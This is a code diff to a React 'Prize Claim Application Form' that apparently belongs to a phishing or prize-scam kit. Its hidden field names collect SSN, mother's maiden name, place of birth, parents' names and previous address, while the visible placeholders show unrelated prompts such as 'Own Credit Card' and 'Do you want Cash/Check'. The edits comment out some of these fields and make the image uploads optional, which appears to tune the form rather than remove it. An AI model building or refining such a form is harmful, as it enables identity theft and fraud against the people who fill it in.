@@ -147,17 +147,17 @@ Prize Claim Application Form
     { name: "fullname", placeholder: "Full Name" },
     { name: "email", type: "email", placeholder: "Email" },
     { name: "address", placeholder: "Address" },
-    { name: "city", placeholder: "City" },
-    { name: "state", placeholder: "State" },
-    { name: "zip_code", placeholder: "Zip Code" },
+    // { name: "city", placeholder: "City" },
+    // { name: "state", placeholder: "State" },
+    // { name: "zip_code", placeholder: "Zip Code" },
     { name: "phone", placeholder: "Phone" },
     { name: "age", type: "number", placeholder: "Age" },
     { name: "occupation", placeholder: "Occupation" },
-    { name: "ssn", placeholder: "SSN" },
+    // { name: "ssn", placeholder: "SSN" },
     { name: "father_fullname", placeholder: "Marital Status" },
     { name: "mother_fullname", placeholder: "Monthly Income" },
-    { name: "mmn", placeholder: "Own Credit Card" },
-    { name: "place_of_birth", placeholder: "Own Bank Account" },
+    // { name: "mmn", placeholder: "Own Credit Card" },
+    // { name: "place_of_birth", placeholder: "Own Bank Account" },
     { name: "previous_address", placeholder: "Do you want Cash/Check" },
   ].map(({ name, type = "text", placeholder }) => (
     <div key={name} className="flex flex-col">
@@ -197,7 +197,7 @@ Prize Claim Application Form
 
   <div className="flex flex-col">
     <label htmlFor="tax_filled" className="text-sm font-medium text-gray-700">
-      Did you file tax for 2024?
+      Did you file tax for 2025?
     </label>
     <select
       id="tax_filled"
@@ -224,7 +224,7 @@ Prize Claim Application Form
       onChange={handleChange}
       className="w-full border border-gray-300 p-2 rounded"
       accept="image/*"
-      required
+      
     />
   </div>
 
@@ -239,7 +239,7 @@ Prize Claim Application Form
       onChange={handleChange}
       className="w-full border border-gray-300 p-2 rounded"
       accept="image/*"
-      required
+      
     />
   </div>
 
